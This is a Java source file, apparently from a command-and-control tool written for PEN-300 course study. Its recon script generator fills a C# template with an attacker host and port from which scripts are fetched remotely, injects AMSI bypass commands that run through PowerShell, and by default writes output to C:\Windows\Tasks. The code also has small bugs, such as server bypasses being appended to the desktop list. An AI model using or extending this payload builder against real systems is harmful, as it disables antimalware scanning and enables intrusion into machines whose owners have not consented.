package c2.session.wizard;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.List;
import java.util.Properties;

import util.test.OutputStreamWriterHelper;

public class ReconScriptGenerator implements Wizard {

	private Pen300TestToolsWizard parent;

	public static final String INVOKE_COMMAND = "recon_gen";

	public ReconScriptGenerator(Pen300TestToolsWizard parent) {
		this.parent = parent;
	}

	@Override
	public void init(Properties properties) throws WizardConfigurationException {
		// TODO Auto-generated method stub

	}

	@Override
	public String getHumanReadableName() {
		return "Recon Script Generator";
	}

	@Override
	public String getInvocationName() {
		return INVOKE_COMMAND;
	}

	@Override
	public void surrenderControlFlow(OutputStreamWriter bw, BufferedReader br) throws IOException {
		String lhost = null;
		String localReconDataDir = "C:\\\\Windows\\\\Tasks";
		String webServerPort = null;
		String file = Files.readString(Paths.get("config", "pen300_study_tools", "pen300_recon", "pen300_recon.cs"));
		boolean alive = true;
		OutputStreamWriterHelper.writeAndSend(bw, getHelpMessage());
		while (alive) {
			String line = br.readLine();
			if (line.startsWith("set_web_server_port")) {
				try {
					String candidateLport = line.split("=")[1];
					Integer.parseInt(candidateLport);
					webServerPort = candidateLport;
				} catch (NumberFormatException ex) {
					OutputStreamWriterHelper.writeAndSend(bw, "set_web_server_port must specify a number");
				} catch (ArrayIndexOutOfBoundsException ex) {
					OutputStreamWriterHelper.writeAndSend(bw, "Invalid format for set_web_server_port");
				}
			} else if (line.startsWith("set_lhost")) {
				try {
					lhost = line.split("=")[1];
				} catch (ArrayIndexOutOfBoundsException ex) {
					OutputStreamWriterHelper.writeAndSend(bw, "Invalid format for set_lhost");
				}
			} else if (line.startsWith("set_local_recon_data_dir")) {
				try {
					localReconDataDir = line.split("=")[1];
				} catch (ArrayIndexOutOfBoundsException ex) {
					OutputStreamWriterHelper.writeAndSend(bw, "Invalid format for set_lhost");
				}
			} else if (line.startsWith("generate")) {
				if (lhost == null || webServerPort == null) {
					OutputStreamWriterHelper.writeAndSend(bw, "Please set lhost and web_server_port before continuing");
					continue;
				}
				file = file.replace("${LHOST}", lhost);
				file = file.replace("${LHOST_WEB_PORT}", webServerPort);
				file = file.replace("$LOCAL_RECON_DATA_DIR", localReconDataDir);

				List<String> winDesktop = parent.getWin10_11AmsiBypassInstructions();
				List<String> winServer = parent.getWinServerAmsiBypassInstructions();

				int maxInstr = winDesktop.size();
				if (winServer.size() > maxInstr) {
					maxInstr = winServer.size();
				}

				StringBuilder winDesktopDeclarations = new StringBuilder();
				StringBuilder winServerDeclarations = new StringBuilder();
				StringBuilder invocations = new StringBuilder();

				for (int idx = 0; idx < maxInstr; idx++) {
					if (idx < winDesktop.size()) {
						winDesktopDeclarations.append("String bypass" + (idx + 1) + " = \"" + winDesktop.get(idx)
								+ "\";" + System.lineSeparator());
					} else {
						winDesktopDeclarations
								.append("String bypass" + (idx + 1) + " = \"echo 'noop'\";" + System.lineSeparator());
					}
					if (idx < winServer.size()) {
						winDesktopDeclarations.append(
								"bypass" + (idx + 1) + " = \"" + winServer.get(idx) + "\";" + System.lineSeparator());
					} else {
						winDesktopDeclarations
								.append("bypass" + (idx + 1) + " = \"echo 'noop'\";" + System.lineSeparator());
					}
					invocations.append("ps.AddScript(bypass" + (idx + 1) + ");" + System.lineSeparator()
							+ "ps.Invoke();" + System.lineSeparator());
				}

				file = file.replace("$WIN10_11_AMSI_BYPASS", winDesktopDeclarations.toString());
				file = file.replace("$WINSERVER_AMSI_BYPASS", winServerDeclarations.toString());
				file = file.replace("$AMSI_BYPASS_INVOKE", invocations.toString());
				alive = false;
				OutputStreamWriterHelper.writeAndSend(bw, file);

			} else {
				OutputStreamWriterHelper.writeAndSend(bw, "Unknown command");
			}
		}
	}

	private String getHelpMessage() {
		StringBuilder sb = new StringBuilder();
		sb.append(
				"Welcome to the recon script generator. This generates a recon script that consolidates into a single C# executable the invocation of the most common test scripts needed for the course."
						+ System.lineSeparator());
		sb.append(
				"Many of the scripts are hosted on a remote host. To use this tool, use the commands set_lhost and set_web_server_port to tell the script where to find your scripts."
						+ System.lineSeparator());
		sb.append(
				"The script is designed to invoke an AMSI command. It also allows for separate AMSI bypass commands to be configured for Windows Desktop and Windows server lineages. Please see the pen300_study_tools/amsi.properties file."
						+ System.lineSeparator());
		sb.append(
				"The script will save all output to C:\\Windows\\Tasks by default, use set_local_recon_data_dir to overwrite this preference."
						+ System.lineSeparator());
		sb.append("Invoke with 'generate' when ready" + System.lineSeparator());
		return sb.toString();
	}

}
